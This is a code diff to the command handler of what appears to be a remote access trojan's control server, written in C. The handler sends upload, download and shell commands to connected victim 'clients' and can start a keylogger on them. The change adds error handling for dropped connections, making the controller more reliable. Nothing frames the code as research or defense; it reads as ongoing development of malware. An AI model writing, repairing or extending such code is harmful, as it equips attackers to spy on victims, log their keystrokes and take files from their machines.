@@ -415,7 +415,13 @@ void handle_client_command(int client_id, char *cmd)
         free(file_contents);
 
         send(client_socket, upload_cmd, strlen(upload_cmd) + 1, 0);
-        recv(client_socket, response, sizeof(response), 0);
+        int received = recv(client_socket, response, sizeof(response), 0);
+        if (received <= 0) {
+            printf("\n[-] Client %d disconnected during upload\n", client_id);
+            remove_client(client_id);
+            selected_client = -1;
+            return;
+        }
         success(response);
         return;
     }
@@ -423,7 +429,13 @@ void handle_client_command(int client_id, char *cmd)
     // Handle download command
     if (strncmp(cmd, "download ", 9) == 0) {
         send(client_socket, cmd, strlen(cmd) + 1, 0);
-        recv(client_socket, response, sizeof(response), 0);
+        int received = recv(client_socket, response, sizeof(response), 0);
+        if (received <= 0) {
+            printf("\n[-] Client %d disconnected during download\n", client_id);
+            remove_client(client_id);
+            selected_client = -1;
+            return;
+        }
 
         if (strncmp(response, "file:", 5) == 0) {
             char *parts[4];
@@ -459,7 +471,13 @@ void handle_client_command(int client_id, char *cmd)
     }
 
     // Send command and receive response
-    send(client_socket, cmd, strlen(cmd) + 1, 0);
+    int sent = send(client_socket, cmd, strlen(cmd) + 1, 0);
+    if (sent <= 0) {
+        printf("\n[-] Failed to send command - client disconnected\n");
+        remove_client(client_id);
+        selected_client = -1;
+        return;
+    }
 
     // Skip receive for certain commands
     if (strcmp(cmd, "keylogger:start") == 0) {
@@ -467,7 +485,13 @@ void handle_client_command(int client_id, char *cmd)
         return;
     }
 
-    recv(client_socket, response, sizeof(response), 0);
+    int received = recv(client_socket, response, sizeof(response), 0);
+    if (received <= 0) {
+        printf("\n[-] Client %d disconnected\n", client_id);
+        remove_client(client_id);
+        selected_client = -1;
+        return;
+    }
     printf("\n%s", response);
 }
 
